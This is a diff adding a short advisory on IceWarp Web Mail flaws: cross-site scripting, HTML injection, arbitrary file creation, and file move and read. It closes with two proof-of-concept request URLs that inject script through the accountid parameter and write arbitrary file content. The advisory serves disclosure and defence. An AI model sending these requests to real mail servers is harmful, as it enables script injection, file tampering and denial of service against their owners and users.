@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/12396/info
+ 
+Multiple remote vulnerabilities reportedly affect IceWarp Web Mail. The underlying issues are due to input and access validation errors.
+ 
+Multiple cross-site scripting and HTML injection vulnerabilities affect the vulnerable software. The product is also vulnerable to a file creation with arbitrary data vulnerability. Finally it is possible for an authenticated attacker to move and read arbitrary files on an affected computer with the privileges of the affected application.
+ 
+An attacker may leverage these issues to move arbitrary files with the privileges of the affected server, to carry out cross-site scripting and HTML injection attacks and to create a file with arbitrary content. These issues may lead to system wide denial of service as well as other attacks. 
+
+http://www.example.com/mail/accountsettings_add.html?id=[]&Save_x=1&account[EMAIL]=hacker&account[HOST]=blackhat.org&account[HOSTUSER]=hacker&account[HOSTPASS]=31337&account[HOSTPASS2]=31337&accountid=[xss_here]
+
+To create a file with arbitrary contents on an affected computer:
+http://www.example.com:32000/mail/accountsettings_add.html?id=[sessionid]&Save_x=1&account[EMAIL]=hacker&account[HOST]=blackhat.org&account[HOSTUSER]=hacker&account[HOSTPASS]=31337&account[HOSTPASS2]=31337&accontid=[arbitary_text]
